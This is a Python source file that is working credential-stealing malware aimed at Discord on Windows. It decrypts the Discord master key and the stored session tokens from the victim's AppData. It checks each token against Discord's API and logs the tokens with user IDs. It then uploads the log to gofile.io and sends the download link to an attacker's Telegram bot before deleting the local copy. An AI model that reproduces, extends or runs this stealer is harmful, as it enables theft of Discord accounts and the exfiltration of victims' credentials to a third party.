import base64
import binascii
from Crypto.Cipher import AES
import win32crypt
import os
import json
import requests
import subprocess

BOT_TOKEN = 'telegram bot token'
CHANNEL_ID = telegram channel id


def send_download_link(download_link):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/SendMessage?chat_id={CHANNEL_ID}&text=Target: {username}\nDownload Link: {download_link}'

    requests.get(url)


def upload_file(file):

    os.chdir('C:\\Users\\' + username)

    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()

    data = json.loads(res)

    server = data['data']

    server = server['server']

    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()

    data = json.loads(res)

    download_link = data['data']['downloadPage']

    send_download_link(download_link)


def token_validator(token):
    r = requests.get(url='https://discord.com/api/v9/users/@me/settings', headers={'Authorization': f'{token}'})
    if r.status_code == 200:
        try:
            return r.status_code, json.loads(r.text)['custom_status']['text']
        except:
            return r.status_code, 'Status'
    else:
        return r.status_code, 'ERROR'


def get_sys_username():
    return os.getlogin()


def get_masterKey():
    """
     Master Key is a key we use it to make the cipher from it then decrypt the token.
    """
    path = 'c:/Users/' + username + '/AppData/Roaming/discord/Local State'  # the location of master key
    with open(path, 'r') as f:
        data = f.read()
        data = json.loads(data)
        key = data['os_crypt'][
            'encrypted_key']  # this is the master key, but it's encrypted with win32crypt windows function
        decoded_key = base64.b64decode(key)[5:]
        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[
            1]  # we decrypted the master key, and it's ready to use


class Discord:
    encrypted_tokens = []
    decrypted_tokens = []

    def __init__(self):
        """
        Grab All Discord Tokens Found on This Machine.
        """

    def get_tokens(self):
        """
        Grab All Tokens Then Decrypt Them and Store them Into a List.
        """
        path: str = "c:/Users/" + username + "/AppData/Roaming/discord/Local Storage/leveldb/"  # Here is where the tokens are stored.
        mkey = get_masterKey()
        for file in os.listdir(path):
            if file[-3:] in ['ldb', 'log']:
                with open(path + file, errors='ignore') as f:
                    data = f.readlines()
                    encrypted_tokens_list = [x.strip().split('dQw4w9WgXcQ:')[1] for x in data if 'dQw4w9WgXcQ:' in x]
                    for enc_token in encrypted_tokens_list:
                        enc_token = enc_token.split()[0].split('"')[0]
                        self.encrypted_tokens.append(enc_token)

        for enc_token in self.encrypted_tokens:
            decoded_token = base64.b64decode(enc_token)
            iv = decoded_token[3:15]
            password = decoded_token[15:]
            cipher = AES.new(mkey, AES.MODE_GCM, iv)
            decrypted_token = cipher.decrypt(password)
            try:
                self.decrypted_tokens.append(decrypted_token[:-15].decode('utf-8'))
            except UnicodeDecodeError:
                try:

                    self.decrypted_tokens.append(decrypted_token[:-16].decode('utf-8'))
                except UnicodeDecodeError:
                    '''Its Not A Token Structure'''
                    continue

        return self.decrypted_tokens


if __name__ == '__main__':
    username = get_sys_username()
    discord = Discord()
    decrypted_tokens = discord.get_tokens()
    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!', ']', '[', '(', ')', '']
    for token in decrypted_tokens:
        for char in not_allowed_chars:
            if char in token:
                token = token.replace(char, '')
        token_resp = token_validator(token)
        uid_list = token.split('.')
        uid = uid_list[0]
        if uid.startswith('NT'):
            dec_uid = base64.b64decode(uid).decode('utf-8')
        elif uid.startswith('MT'):
            uid = uid + '.' + uid_list[1][:2]
            dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
        elif uid.startswith('OD') or uid.startswith('O'):
            uid = uid + '.' + uid_list[1][:4]
            dec_uid = base64.b64decode(uid)[:-3].decode('utf-8')
        else:
            try:
                dec_uid = base64.b64decode(uid).decode('utf-8')
            except binascii.Error:
                uid = ''.join(uid_list)[:28]
                dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')

        os.chdir('C:\\Users\\' + get_sys_username())
        with open('DiscordTokens.txt', 'a', encoding='utf-8', errors='ignore') as f:
            f.writelines(
                ['=' * 65, f'\nCode: {token_resp[0]}\nToken: {token}\nDiscord ID: {dec_uid}\nName: {token_resp[1]}\n',
                 '=' * 65 + '\n\n'])
    upload_file('DiscordTokens.txt')
    os.remove('DiscordTokens.txt')
